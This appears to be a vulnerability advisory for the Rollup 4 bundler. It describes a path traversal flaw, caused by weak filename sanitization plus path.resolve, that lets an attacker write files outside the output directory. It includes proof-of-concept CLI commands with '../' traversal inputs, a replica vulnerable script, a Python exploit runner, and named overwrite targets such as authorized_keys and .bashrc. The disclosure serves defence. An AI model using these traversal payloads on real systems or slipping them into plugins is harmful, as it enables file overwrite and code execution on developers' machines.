summary: "Rollup 4 has Arbitrary File Write via Path Traversal\n### Summary\nThe Rollup module\
  \ bundler (specifically v4.x and present in current source) is vulnerable to an Arbitrary\
  \ File Write via Path Traversal. Insecure file name sanitization in the core engine allows\
  \ an attacker to control output filenames (e.g., via CLI named inputs, manual chunk aliases,\
  \ or malicious plugins) and use traversal sequences (`../`) to overwrite files anywhere on\
  \ the host filesystem that the build process has permissions for. This can lead to persistent\
  \ Remote Code Execution (RCE) by overwriting critical system or user configuration files.\n\
  \n### Details\nThe vulnerability is caused by the combination of two flawed components in\
  \ the Rollup core:\n\n1.  **Improper Sanitization**: In `src/utils/sanitizeFileName.ts`, the\
  \ `INVALID_CHAR_REGEX` used to clean user-provided names for chunks and assets excludes the\
  \ period (`.`) and forward/backward slashes (`/`, `\\`). \n    ```typescript\n    // src/utils/sanitizeFileName.ts\
  \ (Line 3)\n    const INVALID_CHAR_REGEX = /[\\u0000-\\u001F\"#$%&*+,:;<=>?[\\]^`{|}\\u007F]/g;\n\
  \    ```\n    This allows path traversal sequences like `../../` to pass through the sanitizer\
  \ unmodified.\n\n2.  **Unsafe Path Resolution**: In `src/rollup/rollup.ts`, the `writeOutputFile`\
  \ function uses `path.resolve` to combine the output directory with the \"sanitized\" filename.\n\
  \    ```typescript\n    // src/rollup/rollup.ts (Line 317)\n    const fileName = resolve(outputOptions.dir\
  \ || dirname(outputOptions.file!), outputFile.fileName);\n    ```\n    Because `path.resolve`\
  \ follows the `../` sequences in `outputFile.fileName`, the resulting path points outside\
  \ of the intended output directory. The subsequent call to `fs.writeFile` completes the arbitrary\
  \ write.\n\n### PoC\nA demonstration of this vulnerability can be performed using the Rollup\
  \ CLI or a configuration file.\n\n**Scenario: CLI Named Input Exploit**\n1.  Target a sensitive\
  \ file location (for demonstration, we will use a file in the project root called `pwned.js`).\n\
  2.  Execute Rollup with a specifically crafted named input where the key contains traversal\
  \ characters:\n    ```bash\n    rollup --input \"a/../../pwned.js=main.js\" --dir dist\n \
  \   ```\n3.  **Result**: Rollup will resolve the output path for the entry chunk as `dist\
  \ + a/../../pwned.js`, which resolves to the project root. The file `pwned.js` is created/overwritten\
  \ outside the `dist` folder.\n\n**Reproduction Files provided :**\n*   `vuln_app.js`: Isolated\
  \ logic exactly replicating the sanitization and resolution bug.\n*   `exploit.py`: Automated\
  \ script to run the PoC and verify the file escape.\n\nvuln_app.js\n```js\nconst path = require('path');\n\
  const fs = require('fs');\n\n/**\n * REPLICATED ROLLUP VULNERABILITY\n * \n * 1. Improper\
  \ Sanitization (from src/utils/sanitizeFileName.ts)\n * 2. Unsafe Path Resolution (from src/rollup/rollup.ts)\n\
  \ */\n\nfunction sanitize(name) {\n    // The vulnerability: Rollup's regex fails to strip\
  \ dots and slashes, \n    // allowing path traversal sequences like '../'\n    return name.replace(/[\\\
  u0000-\\u001F\"#$%&*+,:;<=>?[\\]^`{|}\\u007F]/g, '_');\n}\n\nasync function build(userSuppliedName)\
  \ {\n    const outputDir = path.join(__dirname, 'dist');\n    const fileName = sanitize(userSuppliedName);\n\
  \n    // Vulnerability: path.resolve() follows traversal sequences in the filename\n    const\
  \ outputPath = path.resolve(outputDir, fileName);\n\n    console.log(`[*] Target write path:\
  \ ${outputPath}`);\n\n    if (!fs.existsSync(path.dirname(outputPath))) {\n        fs.mkdirSync(path.dirname(outputPath),\
  \ { recursive: true });\n    }\n\n    fs.writeFileSync(outputPath, 'console.log(\"System Compromised!\"\
  );');\n    console.log(`[+] File written successfully.`);\n}\n\nbuild(process.argv[2] || 'bundle.js');\n\
  \n```\n\nexploit.py\n```py\nimport subprocess\nfrom pathlib import Path\n\ndef run_poc():\n\
  \    # Target a file outside the 'dist' folder\n    poc_dir = Path(__file__).parent\n    malicious_filename\
  \ = \"../pwned_by_rollup.js\"\n    target_path = poc_dir / \"pwned_by_rollup.js\"\n\n    print(f\"\
  === Rollup Path Traversal PoC ===\")\n    print(f\"[*] Malicious Filename: {malicious_filename}\"\
  )\n    \n    # Trigger the vulnerable app\n    subprocess.run([\"node\", \"poc/vuln_app.js\"\
  , malicious_filename])\n\n    if target_path.exists():\n        print(f\"[SUCCESS] File escaped\
  \ 'dist' folder!\")\n        print(f\"[SUCCESS] Created: {target_path}\")\n        # target_path.unlink()\
  \ # Cleanup\n    else:\n        print(\"[FAILED] Exploit did not work.\")\n\nif __name__ ==\
  \ \"__main__\":\n    run_poc()\n```\n\n## POC \n```rollup --input \"bypass/../../../../../../../Users/vaghe/OneDrive/Desktop/pwned_desktop.js=main.js\"\
  \ --dir dist```\n\n<img width=\"1918\" height=\"1111\" alt=\"image\" src=\"https://github.com/user-attachments/assets/3474eb7c-9c4b-4acd-9103-c70596b490d4\"\
  \ />\n\n\n\n### Impact\nThis is a **High** level of severity vulnerability.\n*   **Arbitrary\
  \ File Write**: Attackers can overwrite sensitive files like `~/.ssh/authorized_keys`, `.bashrc`,\
  \ or system binaries if the build process has sufficient privileges.\n*   **Supply Chain Risk**:\
  \ Malicious third-party plugins or dependencies can use this to inject malicious code into\
  \ other parts of a developer's machine during the build phase.\n*   **User Impact**: Developers\
  \ running builds on untrusted repositories are at risk of system compromise."
